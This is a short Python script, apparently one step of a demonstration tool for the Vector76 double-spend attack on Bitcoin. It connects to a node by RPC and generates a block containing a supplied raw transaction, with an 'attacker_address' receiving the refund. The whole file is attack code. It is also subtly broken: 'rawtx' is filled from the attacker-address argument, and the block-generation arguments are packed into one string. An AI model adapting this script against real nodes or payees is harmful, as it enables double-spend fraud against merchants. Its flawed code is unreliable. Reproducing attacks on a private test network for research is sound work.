import argparse
from bitcoinrpc.authproxy import AuthServiceProxy, JSONRPCException

parser = argparse.ArgumentParser(description="How To Use vector76")
parser.add_argument("node_host_priv",
                    help="private network Node Host",
                    type=str)
parser.add_argument("node_port_priv",
                    help="private network Node Port",
                    type=int)
parser.add_argument("username_priv",
                    help="private network node username",
                    type=str)
parser.add_argument("password_priv",
                    help="private network node password",
                    type=str)
parser.add_argument("attacker_address",
                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
                    type=str)
parser.add_argument("rawtx",
                    help="rawtx",
                    type=str)

args = parser.parse_args()
rpc_host_priv = args.node_host_priv
rpc_port_priv = args.node_port_priv
username_priv = args.username_priv
password_priv = args.password_priv
address = args.attacker_address
rawtx   = args.attacker_address

rpc_node_priv = AuthServiceProxy(f"http://{username_priv}:{password_priv}@{rpc_host_priv}:{rpc_port_priv}")#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
print("Generating Block")
block = rpc_node_priv.generateblock(f"{address} '[{rawtx}]'")
print()
print(block)